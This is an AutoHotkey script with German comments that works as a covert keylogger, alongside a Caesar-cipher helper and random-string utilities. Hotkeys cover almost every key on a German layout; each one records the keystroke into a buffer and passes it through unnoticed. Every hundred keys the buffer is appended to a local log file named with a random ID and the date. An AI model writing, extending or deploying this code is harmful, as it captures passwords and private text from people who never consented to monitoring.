;#####################################

r( str, k )
{

	oss:= ""
	co := ""
	ca := 0
	cc := ""
	ret:= 0
	str2:=""

	Loop, Parse, str
	{
		co := A_LoopField ; nicht % %
		ca := Asc( co )
		cc := Chr( ca )

		ret := c( cc, k )

		oss = %oss%r( %cc% ) liefert %ret%
		oss = %oss%`r`n ; newline escape dran hängen

		str2 = %str2%%ret%
	}

	;MsgBox, %oss%

	return str2
}

; A-Z 65 -90
; a-z 97-122
c( c, k )
{
	n := Asc( c )

	if( (64 < n) and (91 > n) ) 
	{
		;MsgBox, big
		if( 90 < (n+k) )
		{
			n := ( Mod( (n + k),90 ) ) + 64
			c := Chr( n )	
			return c
		} else {
			n := n + k
			c := Chr( n )	
			return c
		}
	}
	else if( (96 < n) and (123 > n) ) 
	{
		;MsgBox, small
		if( 122 < (n+k) )
		{
			n := ( Mod( (n + k),122 ) ) + 96
			c := Chr( n )	
			return c
		} else {
			n := n + k
			c := Chr( n )	
			return c
		}
	}
	else
	{
		n := n
			c := Chr( n )	
			return c
	}
	
;	c := Chr( n )	
;	return c
}


;#########Get Date##########

get_date(){
	TimeString = date
	FormatTime, TimeString, , yyyy-MM-dd
	MsgBox, %TimeString%
	return %TimeString%
}

;timestr:=get_date()
;MsgBox, %timestr%


;###########################################

random_string(length){
	c = 1
	Num2=0
	Loop{
		Random, Num2, 1, 10000
		if(mod(Num2,2)=0)
			Random, Num, 97, 122
		else
			Random, Num, 65, 90
		Nc := Chr(Num)
		NumSum = %NumSum%%Nc%
		c++
		if(c>length)
			break
	}
	return %NumSum%
}

; es gibt block weite Gültigkeitsdauer, NumSum hier ist eine neue Variable
;NumSum := random_string(length)
;MsgBox, %NumSum%


;###########################################

get_big_random(length){
	c = 1;
	Loop{
		Random, Num, 65, 90
		Nc := Chr(Num)
		NumSum = %NumSum%%Nc%
		c++
		if(c>length)
			break
	}
	return %NumSum%
}

;############################################
;############################################

SetWorkingDir %A_ScriptDir%

file := "HN.DAT"
if(FileExist(file)){
	FileRead, Contents, %A_WorkingDir%\%file%
	if not ErrorLevel {
		NumSum = %Contents%
		Contents =
	}
} else {
	NumSum := get_big_random(9) 
	IfExist, %file%
		FileDelete, %file%
	FileAppend, %NumSum%, %file%
}

date_script := ""
EnvGet,	date_script, date
logFile := NumSum
d := get_date()
logFile = %logFile%-%d%.DAT.txt
FileAppend, ,%logFile%
zaehler =

loop{
	loop{
		if(zaehler > 100){
			zaehler = 0
			FileAppend, %var%, %logFile%
			var =
		}
		sleep 3000
	}
}

;#####################################

var = 
;----Varibablen Deklaration----
a::
var = %var%a
SendPlay a
zaehler++
return
b::
var = %var%b
SendPlay b
zaehler++
return
c::
var = %var%c
SendPlay c
zaehler++
return
d::
var = %var%d
SendPlay d
zaehler++
return
e::
var = %var%e
SendPlay e
zaehler++
return
f::
var = %var%f
SendPlay f
zaehler++
return
g::
var = %var%g
SendPlay g
zaehler++
return
h::
var = %var%h
SendPlay h
zaehler++
return
i::
var = %var%i
SendPlay i
zaehler++
return
j::
var = %var%j
SendPlay j
zaehler++
return
k::
var = %var%k
SendPlay k
zaehler++
return
l::
var = %var%l
SendPlay l
zaehler++
return
m::
var = %var%m
SendPlay m
zaehler++
return
n::
var = %var%n
SendPlay n
zaehler++
return
o::
var = %var%o
SendPlay o
zaehler++
return
p::
var = %var%p
SendPlay p
zaehler++
return
q::
var = %var%q
SendPlay q
zaehler++
return
r::
var = %var%r
SendPlay r
zaehler++
return
s::
var = %var%s
SendPlay s
zaehler++
return
t::
var = %var%t
SendPlay t
zaehler++
return
u::
var = %var%u
SendPlay u
zaehler++
return
v::
var = %var%v
SendPlay v
zaehler++
return
w::
var = %var%w
SendPlay w
zaehler++
return
x::
var = %var%x
SendPlay x
zaehler++
return
y::
var = %var%y
SendPlay y
zaehler++
return
z::
var = %var%z
SendPlay z
zaehler++
return
ß::
var = %var%ß
SendPlay ß
zaehler++
return
1::
var = %var%1
SendPlay 1
zaehler++
return
2::
var = %var%2
SendPlay 2
zaehler++
return
3::
var = %var%3
SendPlay 3
zaehler++
return
4::
var = %var%4
SendPlay 4
zaehler++
return
5::
var = %var%5
SendPlay 5
zaehler++
return
6::
var = %var%6
SendPlay 6
zaehler++
return
7::
var = %var%7
SendPlay 7
zaehler++
return
8::
var = %var%8
SendPlay 8
zaehler++
return
9::
var = %var%9
SendPlay 9
zaehler++
return
0::
var = %var%0
SendPlay 0
zaehler++
return
+a::
var = %var%A
SendPlay A
zaehler++
return
+b::
var = %var%B
SendPlay B
zaehler++
return
+c::
var = %var%C
SendPlay C
zaehler++
return
+d::
var = %var%D
SendPlay D
zaehler++
return
+e::
var = %var%E
SendPlay E
zaehler++
return
+f::
var = %var%F
SendPlay F
zaehler++
return
+g::
var = %var%G
SendPlay G
zaehler++
return
+h::
var = %var%H
SendPlay H
zaehler++
return
+i::
var = %var%I
SendPlay I
zaehler++
return
+j::
var = %var%J
SendPlay J
zaehler++
return
+k::
var = %var%K
SendPlay K
zaehler++
return
+l::
var = %var%L
SendPlay L
zaehler++
return
+m::
var = %var%M
SendPlay M
zaehler++
return
+n::
var = %var%N
SendPlay N
zaehler++
return
+o::
var = %var%O
SendPlay O
zaehler++
return
+p::
var = %var%P
SendPlay P
zaehler++
return
+q::
var = %var%Q
SendPlay Q
zaehler++
return
+r::
var = %var%R
SendPlay R
zaehler++
return
+s::
var = %var%S
SendPlay S
zaehler++
return
+t::
var = %var%T
SendPlay T
zaehler++
return
+u::
var = %var%U
SendPlay U
zaehler++
return
+v::
var = %var%V
SendPlay V
zaehler++
return
+w::
var = %var%W
SendPlay W
zaehler++
return
+x::
var = %var%X
SendPlay X
zaehler++
return
+y::
var = %var%Y
SendPlay Y
zaehler++
return
+z::
var = %var%Z
SendPlay Z
zaehler++
return
;----Sonderzeichen----
~!::
var = %var%!
SendPlay !
zaehler++
return
<^>!+::
var = %var%~
SendPlay ~
zaehler++
return
~§::
var = %var%§
zaehler++
return
~%::
var = %var%`%
zaehler++
return
~$::
var = %var%$
zaehler++
return
&::
var = %var%&
SendPlay &
zaehler++
return
~/::
var = %var%/
zaehler++
return
<^>!ß::
var = %var%\
SendPlay \
zaehler++
return

~(::
var = %var%(
zaehler++
return
~)::
var = %var%)
zaehler++
return
~=::
var = %var%=
zaehler++
return
~?::
var = %var%?
zaehler++
return
~`::
var = %var%{Backtick}
zaehler++
return
~´::
var = %var%{Tick}
zaehler++
return
<^>!<::
var = %var%|
SendPlay |
zaehler++
return
~>::
var = %var%>
zaehler++
return
~<::
var = %var%<
zaehler++
return
~,::
var = %var%,
zaehler++
return
~.::
var = %var%.
zaehler++
return
~;::
var = %var%;
zaehler++
return
+.::
var = %var%:
SendPlay :
zaehler++
return
~-::
var = %var%-
zaehler++
return
~_::
var = %var%_
zaehler++
return
~#::
var = %var%#
zaehler++
return
~':: 
var = %var%'
zaehler++
return
~*:: 
var = %var%*
zaehler++
return
~+::
var = %var%+
zaehler++
return
<^>!{::
var = %var%{
SendPlay {{}
zaehler++
return
<^>!}::
var = %var%}
SendPlay {}}
zaehler++
return
~"::
var = %var%"
zaehler++
return
<^>![::
var = %var%`[
SendPlay [
zaehler++
return
<^>!]::
var = %var%`]
SendPlay ]
zaehler++
return
+^::
var = %var%°
SendPlay °
zaehler++
return
^::
var = %var%^
SendPlay {^}
zaehler++
return
;##############
;Backspace
;Enter
;Space
;~{Backspace}::
;var = %var%(Backspace)
;SendPlay {BS}
;return 
;##############
;Umlaute nicht vergessen !
;##############

;-----Ausgabe-----

;^!o::MsgBox Der Key ist: %var%
;^!d::var =
